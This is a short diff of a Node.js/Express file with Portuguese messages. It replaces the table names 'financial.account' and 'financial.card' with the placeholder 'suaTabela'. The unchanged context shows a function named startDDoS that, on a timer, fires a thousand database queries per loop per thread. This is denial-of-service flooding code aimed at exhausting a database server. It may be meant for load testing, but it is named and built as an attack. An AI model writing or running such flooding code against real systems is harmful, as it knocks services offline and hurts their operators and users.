@@ -20,7 +20,7 @@ connection.connect((err) => {
 });
 
 app.get('/dados', (req, res) => {
-    connection.query('SELECT * FROM financial.account', (err, results) => {
+    connection.query('SELECT * FROM suaTabela', (err, results) => {
         if (err) {
             console.error('Erro ao enviar consulta:', err);
             res.status(500).send('Erro ao buscar dados do banco de dados');
@@ -43,7 +43,7 @@ function startDDoS() {
 
         setInterval(() => {
             for (let i = 0; i < 1000; i++) { 
-                connection.query('SELECT * FROM financial.card', (err, results) => {
+                connection.query('SELECT * FROM suaTabela', (err, results) => {
                     if (err) {
                         console.error(`Erro na thread ${threadId} ao enviar consulta:`, err);
                         return;
